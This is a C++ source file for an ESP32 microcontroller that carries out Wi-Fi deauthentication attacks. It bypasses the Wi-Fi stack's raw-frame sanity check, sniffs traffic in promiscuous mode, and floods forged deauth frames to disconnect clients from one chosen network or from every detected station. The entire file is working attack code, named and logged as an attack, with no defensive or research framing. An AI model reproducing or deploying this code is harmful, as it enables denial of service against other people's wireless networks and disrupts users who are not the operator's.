#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;

uint8_t whitelist[10][6];
int whitelist_count = 0;
uint8_t ap_mac[6];

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

bool is_whitelisted(uint8_t* mac) {
  for (int i = 0; i < whitelist_count; i++) {
    if (memcmp(whitelist[i], mac, 6) == 0) return true;
  }
  return false;
}

void add_to_whitelist(uint8_t* mac) {
  if (whitelist_count < 10) {
    memcpy(whitelist[whitelist_count], mac, 6);
    whitelist_count++;
  }
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;
  
  if (is_whitelisted(mac_header->src)) return;
  if (is_whitelisted(mac_header->dest) && memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
    } else return;
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    } else return;
  }

  DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  whitelist_count = 0;
  deauth_type = attack_type;

  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    DEBUG_PRINT("Starting Deauth-Attack on network: ");
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));
    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    wifi_config_t conf;
    esp_wifi_get_config(WIFI_IF_AP, &conf);
    memcpy(ap_mac, conf.ap.bssid, 6);
    add_to_whitelist(ap_mac);
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
  } else {
    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    uint8_t base_mac[6];
    esp_read_mac(base_mac, ESP_MAC_WIFI_STA);
    add_to_whitelist(base_mac);
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth-Attack..");
  esp_wifi_set_promiscuous(false);
}
